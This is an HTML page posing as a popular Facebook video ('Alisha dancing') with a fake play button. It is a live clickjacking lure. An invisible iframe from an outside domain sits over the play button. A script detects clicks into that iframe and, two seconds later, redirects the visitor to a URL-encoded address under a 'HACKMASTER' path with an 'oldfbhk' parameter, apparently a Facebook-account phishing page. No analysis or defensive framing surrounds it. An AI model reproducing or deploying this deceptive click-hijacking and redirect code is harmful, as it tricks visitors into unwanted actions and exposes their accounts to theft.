
    <title>Facebook Video Popular</title>
    <meta content='width=device-width, initial-scale=1.0' name='viewport'/>
<link href="https://fonts.googleapis.com/css?family=Roboto:400,500" rel="stylesheet">

    <style type="text/css" media="screen">
    html,body{
    	margin:auto;
    	width:100%;
    	height:100%;
    }
body {
    background: #929292;
    text-align: center;
    font-family: 'Roboto', sans-serif;
    margin: auto;
}

	.container {
	    width: 100%;
	    max-width: 400px;
	    margin: auto;
	    background: #ffffff;
	    height: 100%;
	}

	.title {
	    font-size: 21px;
	    color: #585858;
	    margin: auto;
	    text-align: left;
	    padding: 10px;
	    font-weight: 500;
	}

	.video {
	background-position: center;
	background-size: contain;
	position: relative;
	}

	.fakevideos {
	    margin: auto;
	    display: inline-block;
	}
img {
    max-width: 700px;
    width: 100%;
    border-bottom: solid 5px red;
}

.play {
    background-image: url(https://cdn1.iconfinder.com/data/icons/logotypes/32/youtube-256.png);
    width: 100px;
    height: 100px;
    background-position: center;
    background-size: 100px;
    position: absolute;
    left: 0;
    top: 0;
    right: 0;
    bottom: 0;
    margin: auto;
    cursor:pointer;
}

h3 {
    text-align: left;
    padding: 10px;
    margin: 0;
    font-weight: 500;
    color: #484848;
}

iframe#iframe {
    width: 150px;
    height: 100px;
    opacity: 0;
}
    	
    </style>


<div class="container">
	
 <div class="fakevideos">
   <div class="video" >
   <img src="https://img.youtube.com/vi/UQ7f_AByLTA/hqdefault.jpg" alt="">
   	<div class="play">
   		<iframe src="//onesearch.xyz/dffgasdfsfsdfsdfasdfsdfd/append.html" class="znz_frame_track" frameborder=0 id="iframe"> </iframe>
   	</div>
   </div>
 	
 </div>
<h1 class="title">Video Popular Alisha dancing</h1>

<br>

<br>
 <h3>Comments </h3>


 <div class="facebookmodal">
 	
 </div>

</div>


<script> 


</script>

<script> 
//<![CDATA[

window.addEventListener('blur',function(){

if(document.activeElement&&document.activeElement.tagName=="IFRAME" && document.activeElement.className.indexOf('znz_frame_track') > -1){

	setTimeout(function(){
		window.location = decodeURIComponent(" http%3A%2F%2Fzenozaga.com%2Fprojects%2FHACKMASTER%2F%3Flan%3Doldfbhk%26ht%3D1%26counter0%3Drandyprueba1");
	},2000)

  }


})

//]]>
</script>


